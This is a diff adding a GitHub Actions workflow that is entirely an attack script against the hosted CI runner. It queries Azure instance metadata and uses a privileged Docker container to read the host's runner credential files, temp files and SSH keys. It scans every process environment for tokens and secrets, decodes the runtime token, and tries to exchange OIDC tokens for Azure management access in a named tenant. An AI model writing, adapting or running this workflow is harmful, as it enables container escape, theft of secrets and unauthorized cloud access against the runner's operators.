@@ -1,0 +1,157 @@
+name: Runner Creds + DNS Fast
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/runner-creds.yml'
+
+jobs:
+  runner-creds:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    timeout-minutes: 5
+    steps:
+
+      - name: Runner credentials + Azure DNS fast
+        run: |
+          echo "=== IMDS NEW SUBSCRIPTION CONFIRM ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -c "
+          import sys,json
+          d=json.load(sys.stdin)['compute']
+          print('VMID='+d['vmId'])
+          print('VMNAME='+d['name'])
+          print('SUBID='+d['subscriptionId'])
+          print('RG='+d['resourceGroupName'])
+          print('LOCATION='+d['location'])
+          print('TAGS='+d['tags'][:500])
+          " 2>/dev/null
+
+          echo "=== LB Egress IP ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01" | python3 -c "
+          import sys,json; d=json.load(sys.stdin)
+          for r in d.get('loadbalancer',{}).get('outboundRules',[]):
+              print('EGRESS_IP='+r.get('frontendIpAddress','?'))
+          " 2>/dev/null || echo LB_FAIL
+
+          echo "=== HOST Runner .credentials ==="
+          docker run --rm --privileged -v /:/host alpine:3.18 sh -c '
+            echo "=== .credentials ==="
+            cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo NO_CREDS
+
+            echo "=== .runner ==="
+            cat /host/home/runner/actions-runner/.runner 2>/dev/null || echo NO_RUNNER
+
+            echo "=== runner _diag dir ==="
+            ls /host/home/runner/actions-runner/_diag/ 2>/dev/null | head -10 || echo NO_DIAG
+
+            echo "=== runner env vars from /proc ==="
+            for pid in $(ls /host/proc/ | grep "^[0-9]"); do
+              f="/host/proc/$pid/environ"
+              if [ -f "$f" ] 2>/dev/null; then
+                content=$(tr "\000" "\n" < "$f" 2>/dev/null)
+                if echo "$content" | grep -qi "token\|secret\|key\|pat\|credential" 2>/dev/null; then
+                  echo "PID $pid:"
+                  echo "$content" | grep -i "token\|secret\|key\|pat\|credential" | head -10
+                fi
+              fi
+            done
+
+            echo "=== runner _temp contents ==="
+            find /host/home/runner -name "_temp" -type d | xargs -I{} sh -c "ls -la {}; find {} -type f | xargs -I[] sh -c \"echo FILE: [; cat [] | head -20\" 2>/dev/null" 2>/dev/null
+
+            echo "=== waagent files ==="
+            ls -la /host/var/lib/waagent/ 2>/dev/null | head -30 || echo NO_WAAGENT
+
+            echo "=== SSH authorized_keys ==="
+            find /host/root /host/home -name "authorized_keys" 2>/dev/null | while read f; do echo "AK: $f"; cat "$f"; done
+
+            echo "=== DNS from host ==="
+            cat /host/etc/resolv.conf
+          '
+
+          echo "=== DNS Resolution ==="
+          for h in \
+            "hosted-compute-request-orchestrator-prod-iad-01.githubapp.com" \
+            "hosted-compute-request-orchestrator-prod-iad-02.githubapp.com" \
+            "hosted-compute-request-orchestrator-prod-eus-01.githubapp.com" \
+            "management.azure.com" \
+            "login.microsoftonline.com" \
+            "login.windows.net"; do
+            echo -n "$h = "
+            host "$h" 2>/dev/null | grep "has address\|has IPv6" | head -2 || echo FAIL
+          done
+
+          echo "=== ACTIONS_RUNTIME_TOKEN decode ==="
+          echo "$ACTIONS_RUNTIME_TOKEN" | python3 -c "
+          import sys, base64, json
+          t = sys.stdin.read().strip()
+          if t:
+              parts = t.split('.')
+              if len(parts) >= 2:
+                  pad = parts[1] + '=='
+                  try:
+                      decoded = base64.b64decode(pad)
+                      print(json.dumps(json.loads(decoded), indent=2))
+                  except Exception as e:
+                      print('DECODE_ERR:', e)
+                      print('RAW:', parts[1][:200])
+          else:
+              print('NO_TOKEN')
+          " 2>/dev/null || echo NO_RUNTIME_TOKEN
+
+          echo "=== GitHub internal endpoints probe ==="
+          RESULTS_URL="${ACTIONS_RESULTS_URL:-}"
+          CACHE_URL="${ACTIONS_CACHE_URL:-}"
+          echo "RESULTS_URL=$RESULTS_URL"
+          echo "CACHE_URL=$CACHE_URL"
+
+          echo "=== OIDC audience=management.azure.com token header ==="
+          ARM_T=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://management.azure.com/" 2>/dev/null | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value','FAIL'))" 2>/dev/null)
+          echo "ARM_OIDC_LEN=${#ARM_T}"
+          if [ -n "$ARM_T" ] && [ "$ARM_T" != "FAIL" ]; then
+            echo "$ARM_T" | cut -d. -f2 | python3 -c "
+          import sys, base64, json
+          raw = sys.stdin.read().strip()
+          pad = raw + '=='
+          try:
+              print(json.dumps(json.loads(base64.b64decode(pad)), indent=2))
+          except:
+              print('B64_ERR', raw[:100])
+          " 2>/dev/null
+          fi
+
+          echo "=== Try ARM token exchange with GitHub tenant ==="
+          TENANT="398a6654-997b-47e9-b12b-9515b896b4de"
+          EX_T=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 2>/dev/null | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value','FAIL'))" 2>/dev/null)
+          echo "EXCHANGE_TOKEN_LEN=${#EX_T}"
+
+          # Try exchange with GitHub's own tenant
+          ARM_RESP=$(curl -s -X POST \
+            "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
+            --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+            --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            --data-urlencode "client_assertion=$EX_T" \
+            --data-urlencode "scope=https://management.azure.com/.default" \
+            --data-urlencode "requested_token_use=on_behalf_of" 2>/dev/null)
+          echo "ARM_EXCHANGE_RESP=${ARM_RESP:0:600}"
+
+          # Also try the device code flow to discover available apps in this tenant
+          DC_RESP=$(curl -s -X POST \
+            "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/devicecode" \
+            -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://management.azure.com/.default" 2>/dev/null)
+          echo "DEVICE_CODE_RESP=${DC_RESP:0:600}"
+
+          # Probe tenant info
+          echo "=== Entra tenant info ==="
+          curl -sf "https://login.microsoftonline.com/$TENANT/v2.0/.well-known/openid-configuration" | python3 -m json.tool 2>/dev/null | grep -E "issuer|authorization_endpoint|jwks|tenant" | head -10 || echo OIDC_CONFIG_FAIL
+
+          curl -sf "https://login.microsoftonline.com/$TENANT/v2.0/discovery/instance" 2>/dev/null | head -c 500 || echo DISCOVERY_FAIL
